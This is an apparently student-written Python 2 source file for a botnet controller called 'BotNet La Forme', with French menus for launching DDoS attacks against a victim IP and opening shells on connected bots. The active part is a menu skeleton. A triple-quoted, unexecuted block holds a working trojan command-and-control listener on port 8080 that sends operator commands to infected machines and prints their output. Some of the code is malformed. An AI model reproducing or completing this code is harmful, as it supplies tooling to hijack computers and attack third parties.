

#Importation des modules 
import socket
import threading
import sys, os

#Ip du serveur
bind_ip = "0.0.0.0" 
bind_port = 8080   

 
# Main definition - constants
menu_actions  = {}  
 
# =======================
#     MENUS FUNCTIONS
# =======================
 
# Main menu
def main_menu():
    	os.system('clear')
	print"*********************************************************"
	print"*********************************************************"
	print"**  _            ______                                **"
	print"** | |           |  ___|                         _     **"
	print"** | |     __ _  | |_ ___  _ __ _ __ ___   ___  (_)    **"
	print"** | |    / _` | |  _/ _ \| '__| '_ ` _ \ / _ \        **"
	print"** | |___| (_| | | || (_) | |  | | | | | |  __/  _     **"
	print"** \_____/\__,_| \_| \___/|_|  |_| |_| |_|\___| (_)    **"
	print"**                                                     **"
	print"** _____ _   _  _____  ______       _   _   _      _   **"
	print"**|_   _| | | ||  ___| | ___ \     | | | \ | |    | |  **"
	print"**  | | | |_| || |__   | |_/ / ___ | |_|  \| | ___| |_ **"
	print"**  | | |  _  ||  __|  | ___ \/ _ \| __| . ` |/ _ \ __|**"
	print"**  | | | | | || |___  | |_/ / (_) | |_| |\  |  __/ |_ **"
	print"**  \_/ \_| |_/\____/  \____/ \___/ \__\_| \_/\___|\__|**"
	print"*********************************************************"
	print"*********************************************************"
	print"****BotNet La Forme Developpe  par: Guillaume Soares,****"
	print"***********Nathan  Fievez et Alexandre Villain***********"
	print"*********************************************************"
	print ""
	print "Quel est votre choix ?"
	print ""
	print "Appuyez sur 1 pour Afficher le Menu DDOS"
	print "Appuyez sur 2 pour Afficher le Menu Bot"
	print " "
	print "\n0. Quit"
	choice = raw_input(" >>  ")
	exec_menu(choice)
 
	return
 
# Execute menu
def exec_menu(choice):
    os.system('clear')
    ch = choice.lower()
    if ch == '':
        menu_actions['main_menu']()
    else:
        try:
            menu_actions[ch]()
        except KeyError:
            print "Selection invalide, veuillez reesseyer\n"
            menu_actions['main_menu']()
    return
 
# Menu 1
def menu1():
    print "Bienvenue sur le menu DDOS \n"
    print ""
    print "Veuillez renseigner l'IP de la victime"
    print ""
    print "9. Retour"
    print "0. Quit"

    choice = raw_input(" >>  ")
    exec_menu(choice)
    return
 
 
# Menu 2
def menu2():
    print "Bienvenue sur le menu Bots\n"
    print "Sur ce menu, il est possible de voir le nombre de Bots connectes et d'ouvrir un SHELL sur l'un d'entre eux"
    print "9. Retour"
    print "0. Quit" 
    choice = raw_input(" >>  ")
    exec_menu(choice)
    return
 
# Back to main menu
def back():
    menu_actions['main_menu']()
 
# Exit program
def exit():
    sys.exit()

# =======================
#    MENUS DEFINITIONS
# =======================
 
# Menu definition
menu_actions = {
    'main_menu': main_menu,
    '1': menu1,
    '2': menu2,
    '9': back,
    '0': exit,
}
 
# =======================
#      MAIN PROGRAM
# =======================
 
# Main Program
if __name__ == "__main__":
    # Launch main menu
    main_menu()









'''


#Creation menu principal
def main_menu():
		print("Quel est votre choix ?")
		print("Appuyez sur 1 pour DDOS" (1))
		print"Appuyez sur 2 pour voir le nombre de bot et/ou ouvrir un SHELL sur l'un d'entre eux"
		print"Appuyez sur 3 pour quitter"
		choix = raw_input("Choix : 1 - 2 - 3 ")
		if choix == "1":
			print ( "good" )




			#send back the packet 
				response = raw_input("which command would you like ?\n")
				client_socket.sendall(response)
			#print the client data
				request = client_socket.recv(2048)
				print "[*] Received: %s\n" % request






# menu DDOS
def menu1():
	print"Bienvenue sur le menu DDOS"

#Menu bot connectes
def menu2():
	print"Bienvenue sur le menu bot"
	print"Sur ce menu, il est possible de voir le nombre de bot connectes et d'ouvrir un SHELL sur l'un d'entre eux"





server = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
server.bind((bind_ip,bind_port))  
server.listen(5)  

# 
print "[*] Trojan ok - listening on %s:%d" %(bind_ip,bind_port)
	
def handle_client(client_socket):
	while True:
		# go to the choice list
		print "[*] What would you like to do ?\n"
		print "[*] go 1 for a shell"
		print "[*] go 2 for ..."
		print "[*] go 2 for ..."
		choiseTrojan = raw_input("[waiting for your choice] 1 - 2 - 3 -> ")
		if choiseTrojan == "1":
			#send back the packet 
			response = raw_input("which command would you like ?\n")
			client_socket.sendall(response)
			#print the client data
			request = client_socket.recv(2048)
			print "[*] Received: %s\n" % request

#loop for waiting connections
while True: 
	client,addr = server.accept()
	print "[*] Accepted connection from %s:%d" % (addr[0],addr[1])
#threading started
	client_handler = threading.Thread(target=handle_client,args=(client,))
	client_handler.start()
'''
